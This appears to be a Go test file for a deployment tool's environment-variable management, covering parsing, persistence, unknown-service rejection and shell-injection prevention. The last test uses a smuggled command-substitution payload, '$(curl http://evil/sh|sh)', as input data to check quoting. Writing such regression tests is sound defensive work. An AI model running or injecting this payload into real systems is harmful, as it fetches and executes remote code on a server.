package usecases

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Dall06/tarhiata-ops/srv/sys/domain"
	"github.com/Dall06/tarhiata-ops/srv/sys/repositories"
	"github.com/Dall06/tarhiata-ops/srv/sys/tests/mocks"
)

func TestManageEnvVarsUseCase_ParseAndFormat(t *testing.T) {
	raw := `
# Comentario de prueba
PORT=8080
DATABASE_URL="postgres://user:pass@localhost:5432/db"
STRIPE_KEY='sk_test_12345'
`
	parsed := ParseEnvContent(raw)

	if parsed["PORT"] != "8080" {
		t.Errorf("expected PORT=8080, got %s", parsed["PORT"])
	}
	if parsed["DATABASE_URL"] != "postgres://user:pass@localhost:5432/db" {
		t.Errorf("expected DATABASE_URL decoded cleanly, got %s", parsed["DATABASE_URL"])
	}
	if parsed["STRIPE_KEY"] != "sk_test_12345" {
		t.Errorf("expected STRIPE_KEY=sk_test_12345, got %s", parsed["STRIPE_KEY"])
	}

	formatted := FormatEnvMap(parsed)
	if formatted == "" {
		t.Errorf("expected formatted env string, got empty")
	}
}

func TestManageEnvVarsUseCase_UpdateAndGet(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "tarhiata_env_test")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	dbPath := filepath.Join(tmpDir, "test.db")
	repo, err := repositories.NewSQLiteRepository(dbPath)
	if err != nil {
		t.Fatalf("failed sqlite init: %v", err)
	}
	defer repo.Close()

	// Seed service
	repo.SaveService(domain.SavedService{
		Name:    "web-api",
		EnvVars: "INITIAL_KEY=val1\n",
	})

	mockSSH := mocks.NewMockSSHExecutor()
	uc := NewManageEnvVarsUseCase(repo, mockSSH)

	// Get initial env
	envData, err := uc.GetEnvVars("web-api", "")
	if err != nil {
		t.Fatalf("unexpected get env error: %v", err)
	}
	if envData.Map["INITIAL_KEY"] != "val1" {
		t.Errorf("expected INITIAL_KEY=val1, got %s (raw: %s)", envData.Map["INITIAL_KEY"], envData.Raw)
	}

	// Update bulk env
	newEnv := "PORT=3000\nNODE_ENV=production\nAPI_KEY=secret99\n"
	err = uc.UpdateEnvVars("web-api", newEnv, domain.ServerConfig{Host: "1.2.3.4"})
	if err != nil {
		t.Fatalf("unexpected update env error: %v", err)
	}

	// Verify persistence
	updatedData, err := uc.GetEnvVars("web-api", "")
	if err != nil {
		t.Fatalf("unexpected error re-fetching env: %v", err)
	}
	if updatedData.Map["PORT"] != "3000" || updatedData.Map["NODE_ENV"] != "production" {
		t.Errorf("env vars not updated correctly: %v", updatedData.Map)
	}
}

// TestManageEnvVarsUseCase_UpdateRejectsUnknownService regresión: actualizar envs de un
// servicio que no existe en el catálogo debe fallar, no fabricar un SavedService nuevo
// con ServerName="" (eso dejaba un duplicado fantasma, con UNIQUE(name, server_name)
// permitiéndolo convivir junto al servicio real de otro servidor con el mismo nombre).
func TestManageEnvVarsUseCase_UpdateRejectsUnknownService(t *testing.T) {
	repo := mocks.NewMockConfigRepository()
	mockSSH := mocks.NewMockSSHExecutor()
	uc := NewManageEnvVarsUseCase(repo, mockSSH)

	err := uc.UpdateEnvVars("no-existe", "KEY=val\n", domain.ServerConfig{Name: "vps-prod", Host: "1.2.3.4"})
	if err == nil {
		t.Fatal("expected error for unknown service, got nil")
	}
	if len(repo.Services) != 0 {
		t.Fatalf("expected no service to be created, got: %+v", repo.Services)
	}
}

// TestManageEnvVarsUseCase_ShellInjectionPrevention valida el flujo completo: un valor
// con metacaracteres de shell debe llegar citado al "docker service update" real (no solo
// con comillas dobles escapadas, que $(...) / backticks siguen expandiendo dentro de
// ellas), y una key con formato inválido debe omitirse en vez de interpolarse cruda.
func TestManageEnvVarsUseCase_ShellInjectionPrevention(t *testing.T) {
	repo := mocks.NewMockConfigRepository()
	repo.Services = []domain.SavedService{{Name: "web-api"}}
	mockSSH := mocks.NewMockSSHExecutor()
	uc := NewManageEnvVarsUseCase(repo, mockSSH)

	rawEnv := "SAFE_KEY=$(curl http://evil/sh|sh)\n"
	if err := uc.UpdateEnvVars("web-api", rawEnv, domain.ServerConfig{Host: "1.2.3.4"}); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var got string
	for _, c := range mockSSH.CommandsExecuted {
		got = c
	}
	want := "--env-add 'SAFE_KEY=$(curl http://evil/sh|sh)'"
	if !strings.Contains(got, want) {
		t.Errorf("comando inseguro, falta citar el valor:\n got:  %s\n want fragment: %s", got, want)
	}
}
